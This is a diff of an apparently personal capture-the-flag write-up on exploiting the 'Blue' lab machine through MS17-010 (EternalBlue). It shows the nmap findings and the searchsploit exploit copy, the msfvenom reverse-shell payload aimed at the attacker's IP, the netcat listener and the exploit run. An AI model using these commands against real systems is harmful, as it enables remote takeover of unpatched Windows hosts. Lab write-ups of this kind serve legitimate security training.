@@ -66,7 +66,7 @@ PORT    STATE SERVICE      REASON          VERSION
 Host script results:
 |_smb-vuln-ms10-054: false
 |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
-| **smb-vuln-ms17-010** : 
+| smb-vuln-ms17-010 : 
 |   VULNERABLE:
 |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
 |     State: VULNERABLE
@@ -85,5 +85,58 @@ Host script results:
 The NSE scripts show Blue is vulnerable to MS17-010, the same issue we exploited for Legacy. But this time, I didn't want to use a walkthrough of the box. Instead, I wanted to see how to manually exploit the issue *for the issue* and not just for the box.
 
 ## Searchsploit
-![Image of Searchsploit for MS17-010]
-()
+![Image of Searchsploit for MS17-010](https://github.com/Malwolf24/OSCP/blob/main/Blue/images/blue_searchsploit.png)
+
+## Exploit
+For this manual walkthrough, I followed Red Team Zone's "Eternal Blue" write-up (https://redteamzone.com/EternalBlue/). First, I mirrored **42315.py** down to my local machine and then made a working copy of it called **exploit.py**. 
+
+```searschsploit -x 42315.py```
+
+```cp 42315.py exploit.py```
+
+For this exploit to work, we need to download **mysmb.py** from https://github.com/worawit/MS17-010/blob/master/mysmb.py:
+
+```
+kali@kali:~/Desktop/OSCP/Blue$ python exploit.py
+Traceback (most recent call last):
+  File "exploit.py", line 3, in <module>
+    from mysmb import MYSMB
+ImportError: No module named mysmb
+```
+
+```
+kali@kali:~/Desktop/OSCP/Blue$ wget https://github.com/worawit/MS17-010/blob/master/mysmb.py
+--2020-10-30 23:32:20--  https://github.com/worawit/MS17-010/blob/master/mysmb.py
+Resolving github.com (github.com)... 140.82.113.3
+Connecting to github.com (github.com)|140.82.113.3|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/html]
+Saving to: ‘mysmb.py’
+
+mysmb.py                                                   [  <=>                                                                                                                       ] 220.11K   553KB/s    in 0.4s    
+
+2020-10-30 23:32:22 (553 KB/s) - ‘mysmb.py’ saved [225389]
+```
+
+Next, we use MSFVenom to generate a reverse TCP shell for windows, specifying my localhost and port 4444 for the shell to connext to once executed:
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f exe > shell.exe
+```
+
+Great! Now we have the exploit and we have our shell. Now, how do we get them to play nice together such that the exploit will execute our shell and connext back to our attacking machine? For that, we need to modify the exploit Python code:
+
+![Exploit modification](https://github.com/Malwolf24/OSCP/blob/main/Blue/images/blue_exploit_mod.png)
+
+Then set up a netcat listener on port 4444:
+
+```nc -nlvp 4444```
+
+And run our exploit code (after we specify username='guest' in the exploit code...for that part...):
+
+```python exploit.py 10.10.10.40```
+
+## Success!
+![Success!](https://github.com/Malwolf24/OSCP/blob/main/Blue/images/blue_success.png)
+
+From here, as with Legacy, we are already system administrator, so we just navigate to both the user's Desktop and administrator's Desktop and retrieve the flags. Success!
